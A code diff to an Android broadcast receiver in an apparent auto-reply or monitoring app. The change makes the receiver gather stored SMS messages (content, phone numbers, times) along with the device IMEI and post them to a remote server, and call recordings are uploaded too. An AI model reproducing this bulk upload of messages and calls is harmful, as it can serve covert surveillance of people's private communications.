@@ -10,6 +10,7 @@ import android.os.Environment;
 import com.google.gson.Gson;
 import com.lzy.okgo.OkGo;
 import com.lzy.okgo.callback.StringCallback;
+import com.mikuwxc.autoreply.bean.ApphttpBean;
 import com.mikuwxc.autoreply.bean.SharePerSmsBean;
 import com.mikuwxc.autoreply.callrecorder.CallDateUtils;
 import com.mikuwxc.autoreply.callrecorder.RecordUpload;
@@ -18,6 +19,9 @@ import com.mikuwxc.autoreply.common.net.NetApi;
 import com.mikuwxc.autoreply.common.util.AppConfig;
 import com.mikuwxc.autoreply.common.util.SPHelper;
 import com.mikuwxc.autoreply.utils.SystemUtil;
+
+import org.json.JSONArray;
+import org.json.JSONException;
 
 import java.io.File;
 import java.io.IOException;
@@ -28,17 +32,15 @@ import okhttp3.Call;
 import okhttp3.Response;
 
 /**
- *
  * create by : 喻敏航
  * create time : 8018-10-16
  * description : 网络状态变化监听广播
- *
- * **/
-public class NetworkChangeReceiver  extends BroadcastReceiver {
+ **/
+public class NetworkChangeReceiver extends BroadcastReceiver {
 
     @Override
     public void onReceive(Context context, Intent intent) {
-        ConnectivityManager connectivityManager = (ConnectivityManager)context.getSystemService(Context.CONNECTIVITY_SERVICE);
+        ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
         NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
         if (networkInfo != null && networkInfo.isAvailable()) {
 
@@ -60,29 +62,35 @@ public class NetworkChangeReceiver  extends BroadcastReceiver {
     }
 
     private void uploadLocalSms() {
+        SPHelper.init(MyApp.getAppContext());
         String sms_list_data = SPHelper.getInstance().getString("SMS_LIST_DATA");
         SharePerSmsBean perSmsBean = new Gson().fromJson(sms_list_data, SharePerSmsBean.class);
 
         SmssBean smssBean = new SmssBean();
 
 
-        if(perSmsBean!=null){
+        if (perSmsBean != null) {
             List<SharePerSmsBean.DataBean> data = perSmsBean.getData();
-            if(data.size()>0){
+            if (data!=null&&data.size() > 0) {
+
+                List<SmssBean> d=new ArrayList<>();
                 for (SharePerSmsBean.DataBean datum : data) {
-
+                    d.add(new SmssBean(datum.getContent(),SystemUtil.getIMEI(MyApp.getAppContext()),"2".equals(datum.getType())?"true":"false",datum.getTime(),datum.getPhone()));
                 }
-
-
-                String json = new Gson().toJson(smssBean);
-                String url=AppConfig.OUT_NETWORK+NetApi.upload_sms_message;
+                String json=new Gson().toJson(d);
+                String url = AppConfig.OUT_NETWORK + NetApi.upload_sms_messages;
                 OkGo.<String>post(url)
                         .tag(this)
                         .upJson(json)
                         .execute(new StringCallback() {
                             @Override
                             public void onSuccess(String s, Call call, Response response) {
-                                SPHelper.getInstance().putString("SMS_LIST_DATA","");
+
+                                ApphttpBean apphttpBean = new Gson().fromJson(s, ApphttpBean.class);
+                                if("200".equals(apphttpBean.getCode())){
+                                    //SPHelper.getInstance().putString("SMS_LIST_DATA", "");
+
+                                }
                             }
 
                             @Override
@@ -91,7 +99,8 @@ public class NetworkChangeReceiver  extends BroadcastReceiver {
                             }
                         });
 
-            }else{}
+            } else {
+            }
         }
 
 
@@ -100,7 +109,7 @@ public class NetworkChangeReceiver  extends BroadcastReceiver {
     private void uploadPhoneRecord() {
         File file = new File(Environment.getExternalStorageDirectory() + "/CallRecorderTest");
         File[] files = file.listFiles();
-        if (files!=null&&files.length > 0) {
+        if (files != null && files.length > 0) {
             for (File f : files) {
                 String name = f.getName();
                 String[] split = name.split("_");
@@ -132,7 +141,7 @@ public class NetworkChangeReceiver  extends BroadcastReceiver {
     }
 
 
-    class SmssBean{
+    class SmssBean {
 
 
         /**
@@ -148,6 +157,17 @@ public class NetworkChangeReceiver  extends BroadcastReceiver {
         private String type;
         private String time;
         private String phone;
+
+        public SmssBean() {
+        }
+
+        public SmssBean(String content, String imei, String type, String time, String phone) {
+            this.content = content;
+            this.imei = imei;
+            this.type = type;
+            this.time = time;
+            this.phone = phone;
+        }
 
         public String getContent() {
             return content;
